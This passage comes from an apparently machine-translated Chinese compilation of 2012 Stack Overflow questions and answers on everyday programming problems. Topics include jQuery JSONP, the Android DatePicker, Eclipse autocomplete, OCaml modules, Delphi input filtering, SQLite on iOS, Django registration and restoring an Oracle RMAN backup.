`foo()`如果我在线程一和线程二中运行这段代码`bar()`，就会出现竞争条件。我认为一个简单的互斥锁可以解决这个问题，但有没有更有效的方法来做到这一点？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-31T09:14:09.070

通过添加的回调`g_io_add_watch`和`g_add_idle`在主循环的线程中执行，无论它们是从哪个线程添加的。

# javascript - 使用 jQuery 进行跨域 ajax JSONP 请求

> ID：11736431
> 
> 赞同：38
> 
> 时间：2012-07-31T08:52:13.720
> 
> 标签：javascript, jquery, ajax, json

我想使用以下代码使用 jquery ajax 解析 JSON 数组数据：

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<title>Sample</title>
<script type="text/javascript" src="Scripts/jquery-1.7.2.min.js"></script>
<script type="text/javascript">
    var result;
    function jsonparser1() {
        $.ajax({
            type: "GET",
            url: "http://10.211.2.219:8080/SampleWebService/sample.do",
            dataType: "jsonp",
            success: function (xml) {
                alert(xml.data[0].city);
                result = xml.code;
                document.myform.result1.value = result;
            },
        });
    }        
</script>    
</head>
<body>
<p id="details"></p>
<form name="myform">
    <input type="button" name="clickme" value="Click here to show the first name" onclick=jsonparser1() />
    <input type="text" name="result1" readonly="true"/>        
</form>
</body>
</html> 
```

我的 JSON 数据是：

```
{"Data":   [{"Address":"chetpet","FirstName":"arulmani","Id":1,"LastName":"sathish","City":"chennai"},{"Address":"ramapuram","FirstName":"raj","Id":2,"LastName":"nagu","City":"chennai"},{"Address":"ramapuram","FirstName":"raj","Id":2,"LastName":"nagu","City":"chennai"},{"Address":"ramapuram","FirstName":"ramaraj","Id":3,"LastName":"rajesh","City":"chennai"},{"Address":"ramapuram","FirstName":"yendran","Id":3,"LastName":"sathi","City":"chennai"}],"Code":true} 
```

但我没有得到任何输出......任何人请帮忙......

* * *

## 回答 #1

> 赞同：90
> 
> 时间：2012-07-31T09:13:49.480

## 概念解释

您是否正在尝试进行跨域 AJAX 调用？意思是，您的服务不是托管在同一个 Web 应用程序路径中吗？您的 Web 服务必须支持方法注入才能执行 JSONP。

您的代码看起来不错，如果您的 Web 服务和您的 Web 应用程序托管在同一个域中，它应该可以工作。

当您执行`$.ajax`有意义的操作时`dataType: 'jsonp'`，jQuery 实际上是在向查询 URL 添加一个新参数。

例如，如果您的 URL 是，`http://10.211.2.219:8080/SampleWebService/sample.do`那么 jQuery 将添加`?callback={some_random_dynamically_generated_method}`.

这种方法更像是一种实际附加在`window`对象中的代理。这没什么特别的，但看起来像这样：

```
window.some_random_dynamically_generated_method = function(actualJsonpData) {
    //here actually has reference to the success function mentioned with $.ajax
    //so it just calls the success method like this: 
    successCallback(actualJsonData);
} 
```

**概括**

您的客户端代码似乎很好。但是，您必须修改服务器代码以使用与查询字符串一起传递的函数名称来包装 JSON 数据。IE

如果您已请求查询字符串

```
?callback=my_callback_method 
```

然后，您的服务器必须响应这样包装的数据：

```
my_callback_method({your json serialized data}); 
```

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2014-08-03T21:01:21.650

您需要使用 ajax-cross-origin 插件： [http ://www.ajax-cross-origin.com/](http://www.ajax-cross-origin.com/)

只需添加选项 crossOrigin: true

```
$.ajax({
    crossOrigin: true,
    url: url,
    success: function(data) {
        console.log(data);
    }
}); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-31T08:54:49.653

您的 JSON-data 包含属性`Data`，但您正在访问`data`. 它区分大小写

```
function jsonparser1() {
    $.ajax({
        type: "GET",
        url: "http://10.211.2.219:8080/SampleWebService/sample.do",
        dataType: "json",
        success: function (xml) {
            alert(xml.Data[0].City);
            result = xml.Code;
            document.myform.result1.value = result;
        },
    });
} 
```

**编辑**也城市和代码是错误的情况。（感谢@Christopher Kenney）

**EDIT2**它也应该是 json，而不是 jsonp（至少在这种情况下）

**更新**根据您的最新评论，您应该阅读以下答案：[https](https://stackoverflow.com/a/11736771/325836) : //stackoverflow.com/a/11736771/325836 by Abdul Muim

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-31T09:00:00.323

尝试

```
alert(xml.Data[0].City) 
```

**区分大小写！**

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-07-31T08:54:30.873

你需要用 jquery json parse 解析你的 xml ......即

```
 var parsed_json = $.parseJSON(xml); 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-07-31T08:54:34.953

警报（xml.data[0].city）；

改用 xml.data["Data"][0].city

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2016-09-16T04:33:26.570

使用由 Yahoo 托管的开放公共代理 YQL。处理 XML 和 HTML

[https://gist.github.com/rickdog/d66a03d1e1e5959aa9b68869807791d5](https://gist.github.com/rickdog/d66a03d1e1e5959aa9b68869807791d5)

# android - Android日期选择器月份作为数字

> ID：11736447
> 
> 赞同：3
> 
> 时间：2012-07-31T08:53:14.523
> 
> 标签：android, operating-system, datepicker

在 Android DatePicker 中，在某些操作系统中，它显示月份为“Jan, Feb, Mar...Dec”，在其他操作系统中显示为 1,2,3..12

有没有办法让它始终保持一致，以便它应该显示 1,2,3.. 12 总是作为月份？

显示 1,2,3..12 而不是字符串的原因是对各种语言的本地化支持。

也建议这样做吗？谢谢。 ![在此处输入图像描述](../Images/756c78b47f74d866de87de87f0af0473.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T09:05:54.653

```
 <?xml version="1.0" encoding="utf-8"?>
    <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
 android:layout_width="fill_parent"
 android:layout_height="fill_parent"
 android:orientation="vertical" > 
<Button
    android:id="@+id/btnChangeDate"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:text="Change Date" /> 
<TextView
    android:id="@+id/lblDate"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:text="Current Date (April-10-2012): "
    android:textAppearance="?android:attr/textAppearanceLarge" /> 
    <TextView
    android:id="@+id/tvDate"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:text=""
    android:textAppearance="?android:attr/textAppearanceLarge" /> 
    <DatePicker
     android:id="@+id/dpResult"
     android:layout_width="wrap_content"
     android:layout_height="wrap_content" />    

     </LinearLayout> 
```

日期选择器类

```
import java.util.Calendar;
 import java.util.Locale;
 import com.datepicker.R.string;
 import android.app.Activity;
 import android.app.DatePickerDialog;
 import android.app.Dialog;
 import android.os.Bundle;
  import android.text.format.DateFormat;
  import android.view.View;
   import android.view.View.OnClickListener;
   import android.widget.Button;
  import android.widget.DatePicker;
    import android.widget.TextView;

public class DatepickerActivity extends Activity {
    private TextView tvDisplayDate;
    private DatePicker dpResult;
    private Button btnChangeDate; 
    private int year;
    private int month;
    private int day;
    private String str;
    public static long UTC (int year, int month, int day, int hour, int minute, int second) {
        return 1;
    }

    static final int DATE_DIALOG_ID = 999;

    //private static final  int August =4;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
    setCurrentDateOnView();
        addListenerOnButton();
    }

    // display current date
    public void setCurrentDateOnView() {

        tvDisplayDate = (TextView) findViewById(R.id.tvDate);
        dpResult = (DatePicker) findViewById(R.id.dpResult);

        final Calendar c = Calendar.getInstance();
        year = c.get(Calendar.YEAR);
        month = c.get(Calendar. MONTH);
        day = c.get(Calendar.DAY_OF_MONTH);
    //  str=c.getDisplayName(c.MONTH, 2, Locale.US);

               // set current date into textview
        tvDisplayDate.setText(new StringBuilder()
        // Month is 0 based, just add 1
        .append(month + 1).append("-").append(day).append("-")
        .append(year).append(" "));

        // set current date into datepicker
        dpResult.init(year, month, day, null);
    } 
    public void addListenerOnButton() {

        btnChangeDate = (Button) findViewById(R.id.btnChangeDate); 
        btnChangeDate.setOnClickListener(new OnClickListener() { 

            public void onClick(View v) { 
                showDialog(DATE_DIALOG_ID);
            }
        });
    }

    @Override
    protected Dialog onCreateDialog(int id) {
        switch (id) {
            case DATE_DIALOG_ID:
                // set date picker as current date
                return new DatePickerDialog(this, datePickerListener,year, month,day);
        }
        return null;
    } 
    private DatePickerDialog.OnDateSetListener datePickerListener = new DatePickerDialog.OnDateSetListener() {

        // when dialog box is closed, below method will be called.
        public void onDateSet(DatePicker view, int selectedYear,int selectedMonth, int selectedDay) {
            year = selectedYear;
            month = selectedMonth;
            day = selectedDay;

            // set selected date into textview
            tvDisplayDate.setText(new StringBuilder().append(str + 1)
                    .append("-").append(day).append("-").append(year)
                    .append(" "));

            // set selected date into datepicker also
            dpResult.init(year, month, day, null);
        }
    }; 
```

}

# eclipse - eclipse中的部分自动完成？

> ID：11736468
> 
> 赞同：2
> 
> 时间：2012-07-31T08:54:42.480
> 
> 标签：eclipse

我对 eclipse 自动完成的方式非常满意，但我想知道它是否可以做更多的事情......

我经常有非常相似命名的变量，例如`myPlayerManagerPane`and `myCharacterManagerPane`，我想知道是否有一种方法可以让我进入名称的一半，输入一两个字符然后自动完成。这将让我复制和过去的代码行，然后通过手术编辑变量名称。它已经到了我尝试这样做的地步（我在自动驾驶仪上自动完成）并获得有趣的变量，例如`myCharacterManagerPaneManagerPane`我自动完成一个全名，中途另一个。

有没有解决的办法？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T09:01:21.280

在**Window > Preferences > Java > Editor > Content Assist**中，选择“ **Completion overwrites** ”，而不是“Completion inserts”。这将用新变量覆盖整个变量。

`Ctrl`或者，您可以在弹出内容辅助窗口时按下以切换此行为。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-09-17T15:13:52.540

您的问题（或者更确切地说，它的前奏）很容易与另一个问题混淆；即，

> 假设我有两个变量`variableLabel`，`variableConfiguration`我怎样才能让 Eclipse 完成这两个变量的公共前缀，即`variable`，在编写或者`L`让`C`Eclipse“自动完成”完成其余部分之前？

这是导致我进入这个线程的问题，所以我觉得我必须回答它：

在**Window > Preferences > Java > Editor > Content Assist**中，选中“自动插入常用前缀”。现在按下`Ctrl+Space`会产生所需的功能。

[相关的 StackOverflow 问题](https://stackoverflow.com/questions/4824168/what-does-insert-common-prefixes-automatically-do-in-eclipse)

# types - ocaml 中的模块化编程

> ID：11736470
> 
> 赞同：5
> 
> 时间：2012-07-31T08:54:44.710
> 
> 标签：types, module, namespaces, ocaml

`ocaml`我在做一个项目时发现了一些我不太了解的东西。

假设我同时使用 OCaml 标准库的`Array`和`List`模块。它们都实现了该功能`length`，但具有不同的类型。在`List`模块中，这是它的类型：

```
length: a' list -> int 
```

在`Array`模块中，它具有以下类型：

```
length: a' array -> int 
```

`open`但后来我希望你通过关键字在我正在实现的同一个模块中使用这两个模块：

```
open List
open Array 
```

当我尝试`length`在列表中使用该函数时，在编译过程中出现类型错误。
由于 OCaml 是一种强大的静态类型语言，我想知道为什么编译器不知道我想要 list 模块的长度函数，因为我声明我同时使用两者。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-07-31T09:02:11.867

OCaml 不会根据它们的类型选择一个或另一个函数。

当你写

```
open Array 
```

模块的功能`Array`是屏蔽`List`同名模块的功能。当您稍后调用 function`length`时，OCaml 会查找名为 的函数`length`，找到`Array.length`并抱怨该函数没有兼容的类型。

如果那是您需要的功能，通常的方法是调用`List.length`（而不仅仅是）。`length`

更一般地说，OCaml 没有名称重载（即有两个具有相同名称但参数类型不同的函数或运算符），特别是因为这会使类型推断更加困难。

# android - Android 中 Spinner 中的古吉拉特语文本

> ID：11736472
> 
> 赞同：-1
> 
> 时间：2012-07-31T08:54:47.570
> 
> 标签：android, spinner

我的 Android 应用程序将在古吉拉特语中。现在我知道如何在应用程序中嵌入古吉拉特语字体，然后在 TextView 和 Button 上使用它。但我也想在 Spinners 上使用它。由于 Spinner 中的字符串来自字符串资源，那么在这种情况下如何使用古吉拉特语字体？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T09:00:35.937

**我可以给你一个演示：**

**[1]** 打开日食

**[2]** 单击文件 > 新建 > 其他 > Android > (Selece) Android 示例项目 > 下一步 > 选择您的 API 级别 > 选择**软键盘演示**> 命名并创建示例项目

**[3]** 在那里你可以找到 res > xml > qwerty.xml

其中包含

```
Key android:codes="119" android:keyLabel="w"
                                          ^  Here you can change your font 
```

现在，您必须制作自己的应用程序来覆盖此软键盘。

# delphi - 停止编辑框中的某些键

> ID：11736479
> 
> 赞同：7
> 
> 时间：2012-07-31T08:55:05.800
> 
> 标签：delphi, browser

所以我已经有代码了。但是当它运行时它不允许退格键，我需要它来允许退格键并删除空格键，因为我不想要空格。

```
procedure TForm1.AEditAKeyPress(Sender: TObject; var Key: Char);
var s:string;
begin
s := ('1 2 3 4 5 6 7 8 9 0 .'); //Add chars you want to allow
if pos(key,s) =0 then begin Key:=#0;
showmessage('Invalid Char');
end; 
```

需要帮助谢谢 :D

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-07-31T09:01:19.867

请注意代码中已有的注释：

```
procedure TForm1.AEditKeyPress(Sender: TObject; var Key: Char);
var s:string;
begin
  s := ('1234567890.'#8); //Add chars you want to allow
  if pos(key,s) =0 then begin
    Key:=#0;
    showmessage('Invalid Char');
  end;
end; 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-07-31T09:07:29.463

最好将您的允许键作为常数（速度，优化）放在一组中：

*更新 #2*只允许一个十进制字符并正确处理 DecimalSeparator。

```
procedure TForm1.Edit1KeyPress(Sender: TObject; var Key: Char);
const
  Backspace = #8;
  AllowKeys: set of Char = ['0'..'9', Backspace];
begin
  if Key = '.' then Key := DecimalSeparator;
  if not ((Key in AllowKeys) or
    (Key = DecimalSeparator) and (Pos(Key, Edit1.Text) = 0)) then
  begin
    ShowMessage('Invalid key: ' + Key);
    Key := #0;
  end;
end; 
```

为了获得更好的结果，请查看 DevExpress、JVCL、EhLib、RxLib 和许多其他库中包含的 TNumericEdit 组件。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-31T15:30:49.557

使用[通灵能力](http://blogs.msdn.com/b/oldnewthing/)，我预测您正在尝试验证浮点值。

您可以使用控件的 OnExit 事件或表单的 Ok/Save 工具来检查正确的格式，如下所示：

```
procedure TForm1.Edit1Exit(Sender: TObject);
var
  Value: Double;
begin
  if not TryStrToFloat(Edit1.Text, Value) then begin
    // Show a message, make Edit1.Text red, disable functionality, etc.
  end;
end; 
```

此代码假定您要使用特定于区域设置的小数分隔符。

如果您只想允许 a`'.'`您可以将`TFormatSettings`记录作为第三个参数传递给`TryStrToFloat`.

# ruby-on-rails - 对 Rails 应用程序的 ajax 请求中的编码错误

> ID：11736482
> 
> 赞同：0
> 
> 时间：2012-07-31T08:55:11.333
> 
> 标签：ruby-on-rails, ajax

我正在开发一个应用程序，在该应用程序中，我需要通过 Ajax 调用将文本数据发送到后端。

但是当文本**“%”出现**在要通过 ajax 发送的文本中时，我从我的 rails 应用程序中得到以下响应

```
Internal Server Error 
invalid %-encoding 
```

我尝试在 % 符号的基础上添加转义字符，但它没有用。

关于这个问题的任何建议都会有所帮助。

* * *

**使用的 Jquery ajax 调用：**

![在此处输入图像描述](../Images/96e05ac39dff558c646b187006619f49.png)

谢谢，巴兰

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T10:07:02.637

您可以将 jquery 传递给 data 选项的对象，它应该为您正确转义它：

```
$.ajax({
  type: "POST",
  url: "/controller",
  data: {
    text: text_from_text_area,
    current_poster: current_poster
  },
  success: function(data){
    alert(data);
  }
}); 
```

请参阅此处的文档：http: [//api.jquery.com/jQuery.ajax/](http://api.jquery.com/jQuery.ajax/)

# java - 在 Tomcat 上使用 Tess4J

> ID：11736486
> 
> 赞同：4
> 
> 时间：2012-07-31T08:55:23.830
> 
> 标签：java, tomcat, ocr, tesseract, native-code

当我使用 Tess4J 库时出现错误：

```
java.lang.NoClassDefFoundError: Could not initialize class net.sourceforge.tess4j.TessAPI 
```

在运行时。

但我不明白这个错误的含义，也无法解决它。

我的问题是 Tess4J 必须加载 2 个本机 dll，但这不在我的掌控之中。我已将 dll 的位置添加到每个 jar 的构建路径中。

我注意到，当我第一次用我的客户触发 Tess4J 时，我收到一个错误：

```
java.lang.UnsatisfiedLinkError: Unable to load library 'libtesseract302' 
```

但每次连续调用都会导致`NoClassDefFoundError`异常。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-03T10:13:59.063

在我的情况下，从 64 位 Java 切换到 32 位 Java 解决了**java.lang.UnsatisfiedLinkError: Unable to load library 'libtesseract302' 问题（Tesseract 是一个 32 位应用程序）**。不要忘记将**libtesseract302.dll**、**liblept168.dll**和**tessdata**放在**jdk/bin 文件夹**中。

# iphone - Error on Xcode 4.3.2

> ID：11736493
> 
> 赞同：0
> 
> 时间：2012-07-31T08:55:55.657
> 
> 标签：iphone, sqlite, xcode4.3

I am new on iphone programming.. I keep getting the error and I have no idea how to change the permission for SQLite

> Error while updating. attempt to write a readonly database

and the following is my coding

> NSString *filePath = [[NSBundle mainBundle]pathForResource:@"card" ofType:@"sqlite"];
> sqlite3_stmt *statement;
> 
> if(sqlite3_open([filePath UTF8String], &db) == SQLITE_OK)
> {
>   const char *query_stmt = "UPDATE card SET isActivate =?";
>   if(sqlite3_prepare_v2(db, query_stmt, -1, &statement, NULL) != SQLITE_OK)
>      {
>          NSAssert1(0, @"Error while creating update statement. '%s'", sqlite3_errmsg(db));
>      }
> }
> 
> sqlite3_bind_int(statement, 1, 1);
> if(SQLITE_DONE != sqlite3_step(statement))
>    {
>       NSLog(@"Error while updating. %s", sqlite3_errmsg(db));
>     }
> 
> sqlite3_finalize(statement);
> sqlite3_close(db);

Hope someone could help me because this really makes me feel frustrated..

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T09:06:19.787

您需要将 sql 文件复制到缓存目录才能正确使用它。
这是我的一些代码：

```
NSString *sqlFile = @"database.sql";
NSArray *cachePath= NSSearchPathForDirectoriesInDomains(NSCachesDirectory, NSUserDomainMask, YES);
NSString *cacheDir = [cachePathobjectAtIndex:0];
databasePath = [cacheDirstringByAppendingPathComponent:sqlFile];

NSFileManager *fileManager = [NSFileManager defaultManager];
// Copy the database sql file from the resourcepath to the documentpath
if (![fileManager fileExistsAtPath:databasePath]) {
    NSString *databasePathFromApp = [[[NSBundle mainBundle] resourcePath] stringByAppendingPathComponent:sqlFile];
    NSError *error;
    [fileManager copyItemAtPath:databasePathFromApp toPath:databasePath error:&error];
    if (error != nil) {
        NSLog(@"[Database:Error] %@", error);
    }
} 
```

# python - Django-registration Module success_url is not returning

> ID：11736497
> 
> 赞同：1
> 
> 时间：2012-07-31T08:56:12.753
> 
> 标签：python, django, django-registration

I am customizing the django-registration module. So far I am passing the url like

```
from django.conf.urls import patterns, include, url

# Uncomment the next two lines to enable the admin:
# from django.contrib import admin
# admin.autodiscover()

from django.contrib import admin
admin.autodiscover()
from django.conf.urls.defaults import *
from django.views.generic.simple import direct_to_template
import registration.backends.default.urls as regUrls

from profile import UserRegistrationForm
from registration.views import register
import regbackend, views
from accounts import profile
urlpatterns = patterns('',     
  #  (r'^conf/admin/(.*)', admin.site.root),
    url(r'^register/$', register, {'backend': 'registration.backends.default.DefaultBackend','success_url':profile,'form_class': UserRegistrationForm}, name='registration_register'),
    (r'^accounts/', include(regUrls)),
    url('^profile/$', direct_to_template, {'template': 'profile.html'}, name="profile"),

) 
```

When the url is requested I get the error `No module named django.views` and it is not going to the `success_url`.

I think i am doing something wrong in `urls.py` but I can't see what. Please help me out.

Thanks in advance.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-08-20T09:30:44.540

尝试更改此行：

```
url(r'^register/$', register, {'backend': 'registration.backends.default.DefaultBackend','success_url':profile,'form_class': UserRegistrationForm}, name='registration_register'), 
```

对此：

```
url(r'^register/$',
    RegistrationView.as_view(
        form_class=UserRegistrationForm,
        success_url='profile/',),
    name='registration_register',
    ), 
```

我在这里没有使用命名的 URL，但是使用硬编码的 URL 可以更容易地让它工作，并在您确定其他一切正常时将其更改为命名。

# jquery - jQuery onclick refreshes the fields

> ID：11736504
> 
> 赞同：1
> 
> 时间：2012-07-31T08:56:47.997
> 
> 标签：jquery, jsf

I have a jsf dropdown that decides the fields to be populated onchange using jQuery

```
$(document).ready(function(){
    //hide all in target div
    $("div","div#fields").hide();
    $("#dbform\\:dbfields").change(function() {
        // hide previously shown in target div
        $("div", "div#fields").hide();
        var value = $("#dbform\\:dbfields").val();
        $("div#" + value).show();
    });
}); 
```

But when I click on the submit button in the `"div#" + value` div tag, the JSF page refreshes and the controls disappear throwing an error saying fields cannot be empty. Not sure how to overcome this. I want the button to submit the event and populate other fields.

# asp.net-mvc - Asp.Net MVC 4：我们可以设置 Layout = null，何时从 ajax 调用加载 Html 数据？

> ID：11736506
> 
> 赞同：5
> 
> 时间：2012-07-31T08:57:01.527
> 
> 标签：asp.net-mvc, jquery

我正在将另一个视图页面（使用 Ajax 请求）添加到我现有的视图页面中，就像这样 -> $("divId").html(data); 这里的数据是我通过 ajax 调用获得的查看页面。我的问题是，对于这个 Ajax 返回的视图页面，我可以删除“布局”或将其设置为 Layout = Null 吗？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-07-31T09:00:32.200

在控制器操作中，您可以返回 a `PartialView`，这只会将 HTML 从视图发送到客户端，而不会发送来自布局的代码。您可以通过以下方式实现您的操作：

```
public ActionResult MyAction()
{
    if (Request.IsAjaxRequest()) 
    {
         return PartialView();
    }
    return View();
} 
```

因此，您可以对普通请求和 Ajax 请求使用相同的 Action。

# c# - 我们如何在运行时将图像从文件夹拖动到窗体？

> ID：11736507
> 
> 赞同：1
> 
> 时间：2012-07-31T08:57:02.537
> 
> 标签：c#, winforms

目前我正在从按钮加载图像。但现在我必须在运行时将图像从文件夹拖到图片框。我们该如何实现呢？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-31T09:43:10.190

好的。下面的代码工作正常。

```
 private void pictureBox1_DragEnter(object sender, DragEventArgs e)
    {

        try
        {
            pictureBox1.Image = null;
            string[] filename = (string[])e.Data.GetData(DataFormats.FileDrop);
            pictureBox1.Image = Image.FromFile(filename[0]);
        }
        catch (Exception expr)
        { }
    } 
```

# sql - Database Access Time - Dependant on language?

> ID：11736510
> 
> 赞同：0
> 
> 时间：2012-07-31T08:57:17.350
> 
> 标签：sql, database, sqlite

If I am going to use a SQLite database to store my data, I was wondering if the language of my program which requests the data will have any outcome on the access time.

For example, if I have my 100mb SQL database and I need to search if for a certain value, would I get faster results if I wrote my program in C as opposed to PHP to query and return the result from SQL?

I’m guessing the language doesn’t make a lot of difference since it is SQLite that is doing most of the heavy work, but I might be wrong.

# oracle - Restoring RMAN Oracle 10g Backup in Oracle 11g

> ID：11736513
> 
> 赞同：4
> 
> 时间：2012-07-31T08:57:27.233
> 
> 标签：oracle, backup, oracle11gr2, rman, oracle-dump

I have the RMAN full database backup of oracle 10g (10.2.0.3) on Sun Solaris OS which I want to restore on oracle 11g (11.2.0.3) on Linux OS. The backup pieces were transferred to the oracle 11g server manually in binary mode. The Oracle 11g is installed on Linux OS. I have only the RMAN backup and no access to the primary database from where the backup has been taken.

```
-rwxrwxr-x 1 mepc dba   36356096 Jul 16 14:49 snapcf_MEPC.f
-rwxrwxr-x 1 mepc dba  166028800 Jul 16 15:29 MEPC_full_backup_MEPC_nnnbkn9f_1_1
-rwxrwxr-x 1 mepc dba  169567744 Jul 16 15:29 MEPC_full_backup_MEPC_nmnbkn9f_1_1
-rwxrwxr-x 1 mepc dba  164813824 Jul 16 15:39 MEPC_full_backup_MEPC_nonbkn9f_1_1
-rwxrwxr-x 1 mepc dba  144025600 Jul 16 16:06 MEPC_full_backup_MEPC_nqnbkn9f_1_1
-rwxrwxr-x 1 mepc dba  168576512 Jul 16 16:09 MEPC_full_backup_MEPC_npnbkn9f_1_1
-rwxrwxr-x 1 mepc dba  168649216 Jul 16 17:33 MEPC_full_backup_MEPC_o5nbkpvv_1_1
-rwxrwxr-x 1 mepc dba  162847232 Jul 16 17:34 MEPC_full_backup_MEPC_o6nbkpvv_1_1
-rwxrwxr-x 1 mepc dba  167351808 Jul 16 17:35 MEPC_full_backup_MEPC_o7nbkpvv_1_1
-rwxrwxr-x 1 mepc dba  166838272 Jul 16 17:36 MEPC_full_backup_MEPC_o8nbkpvv_1_1
-rwxrwxr-x 1 mepc dba  166876160 Jul 16 17:37 MEPC_full_backup_MEPC_o9nbkpvv_1_1
-rwxrwxr-x 1 mepc dba  327606272 Jul 16 17:54 MEPC_full_backup_MEPC_o4nbknav_1_1
-rwxrwxr-x 1 mepc dba  549658624 Jul 16 18:26 MEPC_full_backup_MEPC_o2nbknav_1_1
-rwxrwxr-x 1 mepc dba  162984448 Jul 16 18:28 MEPC_full_backup_MEPC_oanbkpvv_1_1
-rwxrwxr-x 1 mepc dba  163567616 Jul 16 18:29 MEPC_full_backup_MEPC_obnbkpvv_1_1
-rwxrwxr-x 1 mepc dba  161380352 Jul 16 18:29 MEPC_full_backup_MEPC_ocnbkpvv_1_1
-rwxrwxr-x 1 mepc dba 1072275456 Jul 18 13:52 MEPC_full_backup_MEPC_o3nbknav_1_1
-rwxrwxr-x 1 mepc dba 1813348352 Jul 18 17:00 MEPC_full_backup_MEPC_o1nbknav_1_1
-rwxrwxr-x 1 mepc dba   36438016 Jul 25 15:45 controlfile_bkup_MEPC_c-1469445140-20120522-09 
```

the backup is taken in the above format. I know the ORACLE_SID and did of the database from which the backup has been taken.

whenever I tried the following command

```
mepc@tcstctmatson:/mepc_backup/May22fullbkp$ rman target /

Recovery Manager: Release 11.2.0.3.0 - Production on Tue Jul 31 12:14:54 2012

Copyright (c) 1982, 2011, Oracle and/or its affiliates.  All rights reserved.

connected to target database: MEPC (DBID=1595278680)

RMAN> shutdown;
using target database control file instead of recovery catalog
database closed
database dismounted
Oracle instance shut down

RMAN> startup nomount;

connected to target database (not started)
Oracle instance started

Total System Global Area    1071333376 bytes

Fixed Size                     1349732 bytes
Variable Size                620758940 bytes
Database Buffers             444596224 bytes
Redo Buffers                   4628480 bytes

RMAN> restore spfile to '$ORACLE_HOME/dbs/initMEPC.ora' from autobackup db_recovery_file_dest='/mepc_backup/May22fullbkp' db_name='MEPC'; 
```

the following error was notified

```
Starting restore at 31-JUL-12
using channel ORA_DISK_1

recovery area destination: /mepc_backup/May22fullbkp
database name (or database unique name) used for search: MEPC
channel ORA_DISK_1: no AUTOBACKUPS found in the recovery area
channel ORA_DISK_1: looking for AUTOBACKUP on day: 20120731
channel ORA_DISK_1: looking for AUTOBACKUP on day: 20120730
channel ORA_DISK_1: looking for AUTOBACKUP on day: 20120729
channel ORA_DISK_1: looking for AUTOBACKUP on day: 20120728
channel ORA_DISK_1: looking for AUTOBACKUP on day: 20120727
channel ORA_DISK_1: looking for AUTOBACKUP on day: 20120726
channel ORA_DISK_1: looking for AUTOBACKUP on day: 20120725
channel ORA_DISK_1: no AUTOBACKUP in 7 days found
RMAN-00571: ===========================================================
RMAN-00569: =============== ERROR MESSAGE STACK FOLLOWS ===============
RMAN-00571: ===========================================================
RMAN-03002: failure of restore command at 07/31/2012 12:22:06
RMAN-06172: no AUTOBACKUP found or specified handle is not a valid copy or piece 
```

i tried recovering the rman backup through catalog also and the following error was notified

```
List of Files Which Where Not Cataloged
=======================================
File Name: /mepc_backup/May22fullbkp/MEPC_full_backup_MEPC_nonbkn9f_1_1
  RMAN-07517: Reason: The file header is corrupted
File Name: /mepc_backup/May22fullbkp/MEPC_full_backup_MEPC_obnbkpvv_1_1
  RMAN-07517: Reason: The file header is corrupted
File Name: /mepc_backup/May22fullbkp/MEPC_full_backup_MEPC_ocnbkpvv_1_1
  RMAN-07517: Reason: The file header is corrupted
File Name: /mepc_backup/May22fullbkp/MEPC_full_backup_MEPC_o7nbkpvv_1_1
  RMAN-07517: Reason: The file header is corrupted
File Name: /mepc_backup/May22fullbkp/MEPC_full_backup_MEPC_o9nbkpvv_1_1
  RMAN-07517: Reason: The file header is corrupted
File Name: /mepc_backup/May22fullbkp/MEPC_full_backup_MEPC_nmnbkn9f_1_1
  RMAN-07517: Reason: The file header is corrupted
File Name: /mepc_backup/May22fullbkp/MEPC_full_backup_MEPC_nnnbkn9f_1_1
  RMAN-07517: Reason: The file header is corrupted
File Name: /mepc_backup/May22fullbkp/MEPC_full_backup_MEPC_o3nbknav_1_1
  RMAN-07517: Reason: The file header is corrupted
File Name: /mepc_backup/May22fullbkp/MEPC_full_backup_MEPC_o6nbkpvv_1_1
  RMAN-07517: Reason: The file header is corrupted
File Name: /mepc_backup/May22fullbkp/controlfile_bkup_MEPC_c-1469445140-20120522-09
  RMAN-07517: Reason: The file header is corrupted
File Name: /mepc_backup/May22fullbkp/MEPC_full_backup_MEPC_npnbkn9f_1_1
  RMAN-07517: Reason: The file header is corrupted
File Name: /mepc_backup/May22fullbkp/MEPC_full_backup_MEPC_oanbkpvv_1_1
  RMAN-07517: Reason: The file header is corrupted
File Name: /mepc_backup/May22fullbkp/MEPC_full_backup_MEPC_nqnbkn9f_1_1
  RMAN-07517: Reason: The file header is corrupted
File Name: /mepc_backup/May22fullbkp/MEPC_full_backup_MEPC_o1nbknav_1_1
  RMAN-07517: Reason: The file header is corrupted
File Name: /mepc_backup/May22fullbkp/MEPC_full_backup_MEPC_o5nbkpvv_1_1
  RMAN-07517: Reason: The file header is corrupted
File Name: /mepc_backup/May22fullbkp/snapcf_MEPC.f
  RMAN-07517: Reason: The file header is corrupted
File Name: /mepc_backup/May22fullbkp/MEPC_full_backup_MEPC_o2nbknav_1_1
  RMAN-07517: Reason: The file header is corrupted
